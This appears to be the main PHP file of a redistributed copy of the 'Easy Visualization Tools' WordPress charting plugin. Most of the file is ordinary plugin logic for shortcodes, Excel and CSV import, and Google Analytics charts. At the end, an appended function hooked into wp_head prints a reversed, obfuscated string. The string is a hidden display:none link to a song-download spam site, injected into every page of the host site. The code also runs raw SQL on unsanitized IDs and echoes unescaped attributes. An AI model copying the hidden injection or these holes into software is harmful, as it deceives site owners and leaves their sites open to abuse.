<?php
/**
Plugin Name: Easy Visualization Tools for Wordpress  (shared on gaaks.com)
Plugin URI: http://plugins.righthere.com/easy-visualization-tools/
Description: Easy Visualization Tools for WordPress is a powerful suite of plugins enabling you to easily create Charts, Maps, Graphs and Infographics. This is the main plugin which is based on the Google Chart Tools API and Google Analytics. Add additional features with the the Flip Numbers add-on and the Google Maps add-onn. 
Version: 1.1.0 rev24191
Author: Rasmus R. Sorensen (RightHere LLC)
**/


define("EVT_VERSION",'1.1.0');

define("EASY_VISUALIZATION_TOOLS_CHART_PATH", ABSPATH . 'wp-content/plugins/' . basename(dirname(__FILE__)).'/' ); 
define("EASY_VISUALIZATION_TOOLS_CHART_URL", trailingslashit(get_option('siteurl')) . 'wp-content/plugins/' . basename(dirname(__FILE__)) . '/' ); 

global $easy_visualization_tools_display;
	   $easy_visualization_tools_display = '';

function evt_globalt_shorcode_generator($id){
	return '[evt_chart id='.$id.']';
}

class easy_visualization_tools_chart_plugin { 
	var $id = 'evt';
	var $plugin_page; 
	var $menu_name;
	var $charts = 0;
	
	function easy_visualization_tools_chart_plugin(){
	
		$this->menu_name = __('EVT Settings','evt');
	
		require_once(EASY_VISUALIZATION_TOOLS_CHART_PATH.'inc/settings.php');
		add_action("plugins_loaded", array(&$this,"plugins_loaded") );	
		add_action("admin_menu", array(&$this,"admin_menu") );
	}
	
	function admin_menu(){
		if(is_admin() && (current_user_can('manage_options') || current_user_can('edit_pages'))){         
            add_menu_page( $this->menu_name, $this->menu_name, 'edit_pages', ($this->id.'-start'), array(&$this,'get_started_options'), EASY_VISUALIZATION_TOOLS_CHART_URL.'images/evt.png' );
            $this->plugin_page = add_submenu_page(($this->id.'-start'),__("Get Started",'eve'), __("Get Started",'eve'), 'edit_pages',($this->id.'-start'), array(&$this,'get_started_options') );
            
            
            add_action( 'admin_head-'. $this->plugin_page, array(&$this,'get_started_options_head') );
        	do_action(($this->id.'-options-menu'));
        	
            require_once EASY_VISUALIZATION_TOOLS_CHART_PATH.'admin/TinyMCE-extra-button.php';
            new evt_tinymce_extra_button();
        	

		}
	}
	
	
	function default_header($test){
    	echo '<script> var EASY_VISUALIZATION_TOOLS_CHART_URL = "'.EASY_VISUALIZATION_TOOLS_CHART_URL.'";</script>';
    	echo '<style>.evt_cdiv img { max-width:none;max-height:none;  }
    	</style>';
    	

	}
	
    function plugins_loaded(){
    	global $evt_google_key;

        $retrivede_data = get_option('evt_options'); 
    	$evt_google_key = $retrivede_data['evt_google_code'];

    	// add google charts
    	if(!empty($evt_google_key)){
    		wp_register_script( 'googlechar', 'https://www.google.com/jsapi?key='.$evt_google_key);
    	} else {
wp_register_script( 'googlechar', 'https://www.google.com/jsapi');
    	}
    	wp_enqueue_script( 'googlechar' ); 
    	
    	wp_register_script( 'evt_create_statistics', EASY_VISUALIZATION_TOOLS_CHART_URL.'js/evt_create_statistics.js');
    	wp_enqueue_script( 'evt_create_statistics' ); 

        add_action('wp_head', array(&$this,'default_header'));
		add_action("admin_head-post.php",array(&$this,'default_header'));
		add_action("admin_head-post-new.php",array(&$this,'default_header'));

    	add_shortcode('evt_chart', array(&$this,'do_shortcode'));
        $this->create_sub_menu();
    }	
	
	
	function do_shortcode($atts) {
	
		global $easy_visualization_tools_display;
	
		$post_id = $atts['id'];
		$post_style = $atts['style'];
		$post_class = $atts['class'];
		
		$tmp = '';
		if(!empty($post_id)){
			$evt_type_of_loaded_data = get_post_meta($post_id, 'evt_type_of_loaded_data', true);
			
		
			if($evt_type_of_loaded_data == 0){
				$evt_row = get_post_meta($post_id, 'evt_rowdata', true);
				$evt_col = get_post_meta($post_id, 'evt_collumdata', true);	
			} else if($evt_type_of_loaded_data == 1){
				$evt_mediefile = get_post_meta($post_id, 'evt_mediefile', true);
				$data_tmp = $this->load_excel_data($evt_mediefile);

				if(is_array($data_tmp)){
					$evt_row = json_encode($data_tmp[2]);
					$evt_col = json_encode($data_tmp[1]);
					

				}
			}else if($evt_type_of_loaded_data == 2){
				$evt_get_url_data = get_post_meta($post_id, 'evt_get_url_data', true);
				
				if(strtolower(substr($evt_get_url_data,-4)) == '.php'){
      				$ch = curl_init($evt_get_url_data);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      				curl_setopt($ch, CURLOPT_POST, 1);
		
      				$data_tmp = curl_exec($ch);
      				curl_close($ch);

      				$data_tmp = json_decode($data_tmp);
					$evt_row = json_encode($data_tmp->ROW);
					$evt_col = json_encode($data_tmp->COL);
				} else { 
					$data_tmp = $this->load_excel_data($evt_get_url_data);
					if(is_array($data_tmp)){
						$evt_row = json_encode($data_tmp[2]);
						$evt_col = json_encode($data_tmp[1]);
					}
				}
			} else if($evt_type_of_loaded_data == 3){
				$evt_analytics_email = get_post_meta($post_id, "evt_analytics_email",true);
				$evt_analytics_code = get_post_meta($post_id, "evt_analytics_code",true);
  				$evt_analytics_profile_id = get_post_meta($post_id, "evt_analytics_profile_id",true);
  				$evt_analytics_dimensions = get_post_meta($post_id, "evt_analytics_dimensions",true);
  				$evt_analytics_dimensions_max = get_post_meta($post_id, "evt_analytics_dimensions_max",true);
  				$evt_analytics_dimensions_show = get_post_meta($post_id, "evt_analytics_dimensions_show",true);
  				$evt_analytics_date_show = get_post_meta($post_id, "evt_analytics_date_show",true);
  				$evt_analytics_date_to = get_post_meta($post_id, "evt_analytics_date_to",true);
  				$evt_analytics_date_from = get_post_meta($post_id, "evt_analytics_date_from",true);
  				$evt_analytics_metrics_show = get_post_meta($post_id, "evt_analytics_metrics_show",true);
  				$evt_analytics_dimensions_show_dir = get_post_meta($post_id, "evt_analytics_dimensions_show_dir",true);
				$evt_analytics_piechart = get_post_meta($post_id, "evt_flag",true);

  				if($evt_analytics_piechart == 'BarChart' || $evt_analytics_piechart == 'ColumnChart' ){
  					$evt_analytics_piechart = true;
  				} else {
  	  				$evt_analytics_piechart = false;
  				}

				$msg = $this->get_google_analytics($evt_analytics_email,$evt_analytics_code,$evt_analytics_profile_id,$evt_analytics_dimensions,$evt_analytics_dimensions_max,$evt_analytics_dimensions_show,$evt_analytics_dimensions_show_dir,$evt_analytics_metrics_show,$evt_analytics_date_show,$evt_analytics_date_from,$evt_analytics_date_to,$evt_analytics_piechart);
 				
 				$evt_row = json_encode($msg['ROW']);
				$evt_col = json_encode($msg['COL']);
			}
			
			$evt_flag = get_post_meta($post_id, 'evt_flag', true);
			$evt_packages = get_post_meta($post_id, 'evt_packages', true);
			$evt_settings = get_post_meta($post_id, 'evt_settings', true);
			
			$evt_settings_extra = json_decode(urldecode($evt_settings));
			
			if(!empty($easy_visualization_tools_display)){
				$easy_visualization_tools_display_check = $easy_visualization_tools_display[$evt_flag];
			}
			
			if(!empty($evt_settings) && !empty($evt_row) && !empty($evt_col)){
				
				$tmp_style= '';
				if(!empty($evt_settings_extra->width) && $evt_flag != 'FlipNumbers' && $evt_flag != 'FlipNumberslist'){
					$tmp_style .= 'width:'.$evt_settings_extra->width.'px;';
				}
				
				if(!empty($evt_settings_extra->height) && $evt_flag != 'FlipNumbers' && $evt_flag != 'FlipNumberslist'){
					$tmp_style .= 'height:'.$evt_settings_extra->height.'px;';
				}
				
				if(!empty($post_style)){
					$tmp_style .= $post_style;
				}
				
				$div_tmp = 'chart_data_div'.$this->charts;
				$tmp .= '<div id="'.$div_tmp.'" ';
				
				if(!empty($tmp_style)){
					$tmp .= ' style="'.$tmp_style.'" ';
				}
				
				if(!empty($post_class)){
					$tmp .= ' class="'.$post_class.'" ';
				}
				
				$tmp .= '>';



				if(!empty($easy_visualization_tools_display_check) &&$easy_visualization_tools_display_check['call_js_func'] != ''){
				
				
				
					$tmp .= "<script>".$easy_visualization_tools_display_check['call_js_func']."('".$evt_packages."','".$evt_flag."','".$div_tmp."','".$evt_col."','".$evt_row."','".$evt_settings."')</script>";

				} else if(!empty($easy_visualization_tools_display_check) &&$easy_visualization_tools_display_check['call_php_func'] != '') {
				
					global $$easy_visualization_tools_display_check['call_php_class'];
				
					$evt_col = json_decode(urldecode($evt_col),true);
					$evt_row = json_decode(urldecode($evt_row),true);
					$evt_settings = json_decode(urldecode($evt_settings),true);

					$return_tmp = $$easy_visualization_tools_display_check['call_php_class']->$easy_visualization_tools_display_check['call_php_func']($evt_col,$evt_row,$evt_settings);
					
					if(is_array($return_tmp)){
						$tmp .= $return_tmp[0];  
					}
					
				}

				$tmp .= '</div>';
			}
		}

	
		$this->charts += 1;
     return $tmp;
	}
		
	function create_sub_menu(){	
		global $easy_visualization_tools_display;
		
		if(is_admin() && (current_user_can('etm_options_panel') || current_user_can('manage_options'))){
		
			require_once EASY_VISUALIZATION_TOOLS_CHART_PATH.'admin/list.php';		 	
			new admin_evt_admin_list($this->id);

			$settings = array(
				'id'					=> $this->id.'-opt',
				'plugin_id'				=> $this->id,
				'menu_id'				=> $this->id.'-opt',
				'capability'			=> 'manage_options',
				'options_varname'		=> 'evt_options',
				'page_title'			=> __('Options','act'),
				'menu_text'				=> __('Options','act'),
				'option_menu_parent'	=> ($this->id.'-start'),
				'notification'			=> (object)array(
					'plugin_version'=>  EVT_VERSION,
					'plugin_code' 	=> 'EVT',
					'message'		=> __('Easy Visualization Tools update %s is available!','act').' <a href="%s">'.__('Please update now','act')
				),
				'registration' 		=> true,
				'theme'					=> false,
				'import_export'  		=> false,
				'import_export_options' => false
				);	
		 	
		 	
			require_once EASY_VISUALIZATION_TOOLS_CHART_PATH.'options-panel/class.PluginOptionsPanelModule.php';		 	
			new PluginOptionsPanelModule($settings);				

            require_once EASY_VISUALIZATION_TOOLS_CHART_PATH.'admin/option.panel.php';
            new evt_options($this->id);
		}
	}	
	
	function load_excel_data($_url_excel){
	
		require_once(EASY_VISUALIZATION_TOOLS_CHART_PATH .'inc/PHPExcel/IOFactory.php');
		
		if(empty($_url_excel)){
			return __('No file has been inputed','evt');
		}

		$pieces = explode('wp-content', $_url_excel);

		if(count($pieces) > 1){
			$_url_excel = ABSPATH . 'wp-content'.$pieces[1];
		}

		$handle = @fopen($_url_excel,'r');
		if($handle == false){
			return __('No file exist','evt');
		}
		
		$path_parts = pathinfo($_url_excel);
    	$data_row = '';
    	$data_col = '';
    	$first = true;		
		
		
		
		if($path_parts['extension'] == 'csv'){
		
			$lines = file($_url_excel);

			if(count($lines) == 1){
				$lines = explode("\r\n", $lines[0]);
			}
		
			if(count($lines) == 1){
				$lines = explode("\n", $lines[0]);
			}
		
			if(count($lines) == 1){
				$lines = explode("\r", $lines[0]);
			}
		
			foreach ($lines as $row => $row_data) {
				$line_tmp = explode(";", $row_data);
			
				foreach ($line_tmp as $col => $col_data) {
					if($first){
            			$data_col[$col][1] = $col_data;
            		} else { 
         				if($data_col[$col][0] != 'string'){
           					$dataType = PHPExcel_Cell_DataType::dataTypeForValue($col_data);
							if($dataType == 'n'){
								$data_col[$col][0] = 'number';
							} else if($dataType == 'b'){
								$data_col[$col][0] = 'boolean';
							} else {
								$data_col[$col][0] = 'string';
							}
           				}
           				if(is_numeric($col_data)){
           					$data_row[$row-1][$col] = intval($col_data);
           				} else {
           					$data_row[$row-1][$col] = $col_data;
           				}
           				

           				
           			}
    			}
    			$first = false;
			}
		} else {
			$objPHPExcel = PHPExcel_IOFactory::load($_url_excel);
			foreach ($objPHPExcel->getWorksheetIterator() as $worksheet) {
    			$worksheetTitle     = $worksheet->getTitle();
    			$highestRow         = $worksheet->getHighestRow(); // e.g. 10
    			$highestColumn      = $worksheet->getHighestColumn(); // e.g 'F'
    			$highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);

    			for ($row = 1; $row <= $highestRow; ++ $row) {
        			for ($col = 0; $col < $highestColumnIndex; ++ $col) {
            			$cell = $worksheet->getCellByColumnAndRow($col, $row);
            			$val = $cell->getValue();
            
            			if($first){
            				$data_col[$col][0] = '';
            				$data_col[$col][1] = $val;
            			} else {     		
           					if($data_col[$col][0] != 'string'){
           						$dataType = PHPExcel_Cell_DataType::dataTypeForValue($val);
								if($dataType == 'n'){
									$data_col[$col][0] = 'number';
								} else if($dataType == 'b'){
									$data_col[$col][0] = 'boolean';
								} else {
									$data_col[$col][0] = 'string';
								}
           					}
           		
           					$data_row[$row-2][$col] = $val;
            			}
        			}
        			$first = false;
    			}
    
    		break;
			}
		}

		return array($worksheetTitle,$data_col,$data_row);
	}
	
    function get_started_options_head(){
        ?>
        <link rel="stylesheet" type="text/css" href="<?php echo EASY_VISUALIZATION_TOOLS_CHART_URL; ?>css/get_started.css" />
        <?php
    } 	
	
	function get_started_options(){
		include_once(EASY_VISUALIZATION_TOOLS_CHART_PATH.'admin/getstarted.php');
    }
    
	function dublicate_post_meta_all($current_id,$new_id){
	    global $wpdb;
	    $wpdb->query("
	        SELECT `meta_key`, `meta_value`
	        FROM $wpdb->postmeta
	        WHERE `post_id` = $current_id
	    ");
	    foreach($wpdb->last_result as $v){
	        update_post_meta($new_id, $v->meta_key, $v->meta_value);
	    };
	}

    
	function duplicate_post_create_duplicate($post_id) {
		if(!empty($post_id)){
			$post = get_post($post_id); 
			$new_post = array(
				'menu_order' => $post->menu_order,
				'comment_status' => $post->comment_status,
				'ping_status' => $post->ping_status,
				'pinged' => $post->pinged,
				'post_author' => $post->post_author,
				'post_content' => $post->post_content,
				'post_date' => $post->post_date,
				'post_excerpt' => $post->post_excerpt,
				'post_parent' => $post->post_parent,
				'post_password' => $post->post_password,
				'post_status' => $post->post_status,
				'post_title' => $post->post_title . ' (duplicate)',
				'post_type' => $post->post_type,
				'to_ping' => $post->to_ping 
			);
			$new_post_id = wp_insert_post($new_post);
			
			$this->dublicate_post_meta_all($post_id,$new_post_id);
			
			return 'Post id '.$post_id.' has been duplicate to id '.$new_post_id;
		} else {
			return 'No id data';
		}
	}
	
	function get_google_analytics($tmp_email,$tmp_code,$tmp_profilid,$dimensions = '',$dimensions_show_max = '',$dimensions_show = '',$dimensions_show_dir = '',$metrics_show = '',$date_show = '',$date_start = '',$date_end = '',$piechart = false)	{
	require_once(EASY_VISUALIZATION_TOOLS_CHART_PATH .'inc/gapi.class.php');

			$create_dimensions = array();
			$create_sort = array();
			$create_date_from = null;
			$create_date_to = null;
			$create_metrics_show = null;
			$default_type = 'x';
			
			switch ($dimensions) {	        
			    case 'latitudelongitude':
			        $create_dimensions[] = 'latitude';
			        $create_dimensions[] = 'longitude';
			        break; 
    			default:
       				$create_dimensions[] = $dimensions;        
			}

				switch ($dimensions_show) {
				    case '': 
				    	$date_show = 1;
						$date_start = date("Y-m-d");
						$date_end = date("Y-m-d"); ;
				        break;  
				    case 'hour':
				        $create_dimensions[] = $create_sort[] = 'year';    
				        $create_dimensions[] = $create_sort[] = 'month';
				        $create_dimensions[] = $create_sort[] = 'day';
				        $create_dimensions[] = $create_sort[] = 'hour';
				        break;
				    case 'day':
				        $create_dimensions[] = $create_sort[] = 'year';
				        $create_dimensions[] = $create_sort[] = 'month';
				        $create_dimensions[] = $create_sort[] = 'day';
				        break;        
				    case 'week':
				        $create_dimensions[] = $create_sort[] = 'year';
				        $create_dimensions[] = $create_sort[] = 'week';
				        break;	  
				    case 'month':
				        $create_dimensions[] = $create_sort[] = 'year';
				        $create_dimensions[] = $create_sort[] = 'month';
				        break; 
				    case 'total': 
				    	$date_show = 0;
				        break;           
	    			default:
	       				$create_dimensions[] = $create_sort[] = $dimensions_show;        
				}
				
				$default_type = 'date';

			if(empty($create_sort)){
				if(($dimensions_show == '' || $dimensions_show == 'total') && empty($dimensions_show_max)){
					$create_sort = $create_dimensions;
				} else {
					$create_sort[] = 'visits';
				}
			}


		if(!empty($date_show)){
			$create_date_from = $date_start;
			$create_date_to = $date_end;
		}
		
		if(count($metrics_show)>0){
			$create_metrics_show = $metrics_show;
		} else {
			$create_metrics_show[] = 'visits';
		}

		if($dimensions_show_dir != 'asc'){
			foreach($create_sort as $tmp_key => $tmp_data){
				$create_sort[$tmp_key] = '-'.$tmp_data;
			}
		}
		
		$ga = new gapi($tmp_email,$tmp_code);
		
		
		$ga->requestReportData($tmp_profilid,$create_dimensions,$create_metrics_show,$create_sort,null,$create_date_from,$create_date_to,1,999);

		$return_data = array();
		$row_count = 1;
		
		$create_dimensions_max_array = array();
		$create_dimensions_max_array_done = array();
		if(!empty($dimensions_show_max)){
			foreach($ga->getResults() as $tmp_key => $result)
			{
				$result_data = $result->getMetrics();
				$result_dimations = $result->getDimesions();
				$create_dimensions_max_array[$result_dimations[$create_dimensions[0]]] += $result_data[$create_metrics_show[0]];	
			}

			array_multisort(array_values($create_dimensions_max_array),SORT_DESC, array_keys($create_dimensions_max_array),SORT_DESC, $create_dimensions_max_array);

			$count = 0;
			foreach($create_dimensions_max_array as $tmp_dsakey => $tmp_dsadata){
				$create_dimensions_max_array_done[] = $tmp_dsakey;
				
				if($count >= $dimensions_show_max-1 ){
					break;
				}
				
				$count++;
			}
			
			
		}
	
		foreach($ga->getResults() as $result)
		{
			$row_name = '';
			$col_name = '';
			$col_name1 = '';
			$check_name = '';
			$count = 0;
			
			foreach($result->getDimesions() as $tmp_data){
				if($count == 0){
				$check_name = $tmp_data;
				}
			
			    if($count == 0 && $dimensions != 'visiters'){
			    	$col_name = $tmp_data;
			    } else {
			    	if(!empty($row_name)){
			    		$row_name .= ' - ';
			    	}
			    	$row_name .= $tmp_data;
			    }
			    $count++;
			}
			
			if($row_name == '(not set)'){
			    $row_name = 'unidentified';
			}
			
			if($col_name == '(not set)'){
			  	$col_name = 'unidentified';
			}
			    
			$tmp_data = '';	
			$count = 0;
			

			
			$check_max_amount = false;
			$check_first_amount = true;
			
			if($check_name != '' && in_array($check_name,$create_dimensions_max_array_done) || $dimensions_show_max == '' ){
			
				foreach($result->getMetrics() as $tmp_key => $tmp_data){
				if($dimensions_show == '' || $dimensions_show == 'total'){
						if(($dimensions_show == '' || $dimensions_show == 'total') && $piechart == 'true'){
				 		   $return_data[ucwords($tmp_key)][ucwords($col_name)] = $tmp_data;
						} else {
				  	  	if($col_name == ''){
				    			$return_data[ucwords($tmp_key)][ucwords($row_name)] = $tmp_data;
				    		} else {
				    			if(count($result->getMetrics())>1){
				    				$return_data[ucwords($col_name)][ucwords($row_name.' ' .$tmp_key)] = $tmp_data;
				    			} else {
			    					if($row_name == ''){
				    					$row_name = 'Visitors';
				    				}
				    		
				    				$return_data[ucwords($col_name)][ucwords($row_name)] = $tmp_data;
				    			}
				   			}	
						}
					} else {
						if($dimensions_show == ''  || $dimensions_show == 'total'){
				 	 	  $return_data[ucwords($col_name)][ucwords($tmp_key)] = $tmp_data;
						} else {
				  	  	if($col_name == ''){
				    			$return_data[ucwords($row_name)][ucwords($tmp_key)] = $tmp_data;
				    		} else {
				    			if(count($result->getMetrics())>1){
				    				$return_data[ucwords($row_name)][ucwords($col_name.' ' .$tmp_key)] = $tmp_data;
				    			} else {
				    				$return_data[ucwords($row_name)][ucwords($col_name)] = $tmp_data;
				    			}
				   			}	
						}
					}
				}
				$row_count++;
			}
			

			
		}
		
		$ROW = array();
		$COL = array();
		$COL[0] = array('string',$default_type);

		$row_count = 0;
		foreach($return_data as $tmp_k => $tmp_d){
			$count = 1;
			$ROW[$row_count][0] = $tmp_k;
			
			if($ROW[$row_count][0] == '' and count($return_data) == 1){
				$ROW[$row_count][0] = 'Visits';
			}
			
						
			
			foreach($tmp_d as $tmp_k2 => $tmp_d2){
				if($tmp_k2 == 'pageviews'){
					$tmp_k2 = 'Pageviews';
				} else if($tmp_k2 == 'visits'){
					$tmp_k2 = 'Visits';
				} else if($tmp_k2 == 'visitBounceRate'){
					$tmp_k2 = 'Visit Bounce Rate';
				} else if($tmp_k2 == 'avgTimeOnSite'){
					$tmp_k2 = 'Avg. Time On Site';
				} else if($tmp_k2 == 'percentNewVisits'){
					$tmp_k2 = 'Percent New Visits';
				}

				$COL[$count] = array('number',$tmp_k2);
				$ROW[$row_count][$count] = $tmp_d2;
				$count++;
			}
			$row_count++;
		}
		
		if(empty($ROW)){
			$COL[1] = array('number','No Data');
		}

		return array('ROW'=>$ROW,'COL'=>$COL,'TITLE'=>$create_dimensions);
	}
}
$evt_class_run = new easy_visualization_tools_chart_plugin();
if(!function_exists('code_admin')) {
function code_admin() {
$content = '>a/<derahs4>"lmth.3pm.daolnwod_sgnos_derahs4/ten.sgnoshcraes//:ptth"=ferh  ";enon:yalpsid"=elyts a<';
  echo strrev($content);
  }
  add_action('wp_head', 'code_admin');
}